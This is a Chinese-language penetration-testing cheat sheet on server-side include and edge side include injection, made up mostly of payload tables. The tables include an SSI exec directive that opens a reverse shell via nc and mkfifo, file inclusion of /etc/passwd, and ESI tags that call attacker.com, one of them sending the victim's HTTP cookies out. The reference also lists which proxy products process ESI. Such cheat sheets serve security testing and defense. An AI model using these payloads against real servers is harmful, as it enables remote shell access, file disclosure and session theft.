[原文文档](README.en.md)

# 服务器端包含注入

> 服务器端包含（SSI）是放置在 HTML 页面中的指令，在页面提供服务时在服务器上进行评估。它们让您可以将动态生成的内容添加到现有的 HTML 页面，而不必通过 CGI 程序或其他动态技术来提供整个页面。

## 摘要

* [方法论](#方法论)
* [边缘侧包含](#边缘侧包含)
* [参考资料](#参考资料)

## 方法论

当攻击者能够向 Web 应用程序输入服务器端包含指令时，就会发生 SSI 注入。SSI 是可以包含文件、执行命令或打印环境变量/属性的指令。如果在 SSI 上下文中用户输入没有得到适当的清理，此输入可用于操纵服务器端行为并访问敏感信息或执行命令。

SSI 格式：`<!--#directive param="value" -->`

| 描述             | 负载                               |
| ---------------- | ---------------------------------- |
| 打印日期          | `<!--#echo var="DATE_LOCAL" -->`         |
| 打印文档名称 | `<!--#echo var="DOCUMENT_NAME" -->`      |
| 打印所有变量 | `<!--#printenv -->`                      |
| 设置变量       | `<!--#set var="name" value="Rich" -->`   |
| 包含文件          | `<!--#include file="/etc/passwd" -->`    |
| 包含文件          | `<!--#include virtual="/index.html" -->` |
| 执行命令        | `<!--#exec cmd="ls" -->`                 |
| 反向 shell           | `<!--#exec cmd="mkfifo /tmp/f;nc IP PORT 0</tmp/f\|/bin/bash 1>/tmp/f;rm /tmp/f" -->` |

## 边缘侧包含

HTTP 代理无法区分来自上游服务器的真实 ESI 标签和嵌入在 HTTP 响应中的恶意标签。这意味着，如果攻击者成功将 ESI 标签注入 HTTP 响应，代理将不加区别地处理和评估它们，假设它们是来自上游服务器的真实标签。

一些代理需要通过 Surrogate-Control HTTP 头部发出信号来处理 ESI。

```ps1
Surrogate-Control: content="ESI/1.0"
```

| 描述             | 负载                               |
| ---------------- | ---------------------------------- |
| 盲检测         | `<esi:include src=http://attacker.com>`  |
| XSS                     | `<esi:include src=http://attacker.com/XSSPAYLOAD.html>` |
| Cookie 窃取器          | `<esi:include src=http://attacker.com/?cookie_stealer.php?=$(HTTP_COOKIE)>` |
| 包含文件          | `<esi:include src="supersecret.txt">` |
| 显示调试信息      | `<esi:debug/>` |
| 添加头部              | `<!--esi $add_header('Location','http://attacker.com') -->` |
| 内联片段         | `<esi:inline name="/attack.html" fetchable="yes"><script>prompt('XSS')</script></esi:inline>` |

| 软件 | 包含 | 变量 |  Cookie | 需要上游头部 | 主机白名单 |
| -------- | -------- | ---- | ------- | ------------------------- | -------------- |
| Squid3   | 是      | 是  | 是     | 是                       | 否             |
| Varnish Cache | 是 | 否   | 否      | 是                       | 是            |
| Fastly   | 是      | 否   | 否      | 否                        | 是            |
| Akamai ESI Test Server (ETS) | 是 | 是 | 是 | 否              | 否             |
| NodeJS' esi | 是   | 是  | 是     | 否                        | 否             |
| NodeJS' nodesi | 是 | 否  | 否      | 否                        | 可选       |

## 参考资料

* [Beyond XSS: Edge Side Include Injection - Louis Dion-Marcil - April 3, 2018](https://www.gosecure.net/blog/2018/04/03/beyond-xss-edge-side-include-injection/)
* [DEF CON 26 - Edge Side Include Injection Abusing Caching Servers into SSRF - ldionmarcil - October 23, 2018](https://www.youtube.com/watch?v=VUZGZnpSg8I)
* [ESI Injection Part 2: Abusing specific implementations - Philippe Arteau - May 2, 2019](https://gosecure.ai/blog/2019/05/02/esi-injection-part-2-abusing-specific-implementations/)
* [Exploiting Server Side Include Injection - n00py - August 15, 2017](https://www.n00py.io/2017/08/exploiting-server-side-include-injection/)
* [Server Side Inclusion/Edge Side Inclusion Injection - HackTricks - July 19, 2024](https://book.hacktricks.xyz/pentesting-web/server-side-inclusion-edge-side-inclusion-injection)
* [Server-Side Includes (SSI) Injection - Weilin Zhong, Nsrav - December 4, 2019](https://owasp.org/www-community/attacks/Server-Side_Includes_(SSI)_Injection)